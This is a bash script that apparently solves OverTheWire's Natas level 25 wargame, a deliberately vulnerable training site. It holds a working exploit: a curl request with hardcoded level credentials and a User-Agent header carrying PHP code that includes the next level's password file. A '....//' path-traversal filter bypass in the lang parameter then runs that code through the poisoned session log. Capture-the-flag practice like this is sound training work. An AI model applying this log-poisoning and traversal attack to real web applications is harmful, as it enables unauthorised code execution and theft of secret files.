#!/bin/bash

curl -u "natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws" \
	-v \
	-H "Cookie: PHPSESSID=quantum12" \
	-H "User-Agent: <?php include '/etc/natas_webpass/natas26'; ?>" \
	-H "Content-Type: application/x-www-form-urlencoded" \
	"http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_quantum12.log" | batcat -l html





